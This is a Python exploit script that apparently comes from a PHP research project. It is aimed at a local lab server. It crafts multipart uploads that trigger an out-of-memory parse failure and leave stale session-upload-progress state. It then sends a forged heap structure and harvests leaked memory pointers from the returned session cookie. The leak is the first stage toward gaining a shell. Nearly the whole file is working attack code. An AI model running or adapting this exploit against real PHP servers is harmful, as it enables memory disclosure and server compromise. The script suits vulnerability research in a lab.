#!/usr/bin/env python3
"""Hybrid test: stock-config (128M/8M) A1-style parse-OOM to arm stale PS(id),
then alvarodh5's stage-1 leak request. Checks whether the leak mechanism is
independent of how the stale state was created."""
import os, struct, subprocess, sys, time

sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as A  # noqa: E402
from exploit import Target, multipart, parse_cookie  # noqa: E402

LAB = "http://localhost:18110/index.php"
PURE = "/Users/bill/php2shell/ninebie/pure"
MK_A1 = os.path.join(PURE, "mk_a1.py")
CHUNKED = os.path.join(PURE, "chunked_send.py")


def send_raw(port: int, path: str, body_file: str) -> bytes:
    resp_f = body_file + ".resp"
    subprocess.run(
        ["python3", CHUNKED, "--host", "127.0.0.1",
         "--port", str(port), "--body-file", body_file, "--path", path,
         "--timeout", "120", "--save-response", resp_f], capture_output=True)
    try:
        return open(resp_f, "rb").read()
    except FileNotFoundError:
        return b""


def main() -> int:
    # 1) arm: A1 parse-OOM (stock lab known-bad shape from session 8 bisection)
    a1 = "/tmp/p2s-lab/hybrid_a1.bin"
    os.makedirs("/tmp/p2s-lab", exist_ok=True)
    subprocess.run(["python3", MK_A1, "--out", a1, "--parts", "860",
                    "--progress-len", "4075", "--tail", "10"], check=True,
                   capture_output=True)
    print("[*] sending A1 arm request (expect parse OOM, no cookie)...")
    resp = send_raw(18110, "/index.php?q=1", a1)
    print("    arm resp: %d bytes, cookie=%s fatal=%s" % (
        len(resp), b"Set-Cookie" in resp, b"Allowed memory size" in resp))
    time.sleep(0.3)

    # 2) leak request = alvarodh5 stage1 body (minus the _oom prefix)
    t = Target(LAB)
    SID = b"attacksessionid0001"
    parts = [{"name": "PHPSESSID", "data": SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(841):
        parts.append({"name": str(1000 + i),
                      "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    print("[*] sending stage-1 leak request...")
    raw = parse_cookie(t.post(multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20))
    print("    cookie decoded len=%d" % len(raw))
    if not raw:
        print("[!] no Set-Cookie at all")
        return 1
    if len(raw) < 1000:
        print("[!] short cookie (no leak): %r" % raw[:80])
        return 1
    from collections import Counter
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x100000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    print("    pointer buckets:", [(hex(k), n) for k, n in c.most_common(6)])
    if not c:
        print("[!] long cookie but no kernel-range pointers")
        return 1
    base, n = c.most_common(1)[0]
    print("[+] LEAK WORKS ON STOCK CONFIG! chunk base candidate = %#x (n=%d)" % (base, n))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
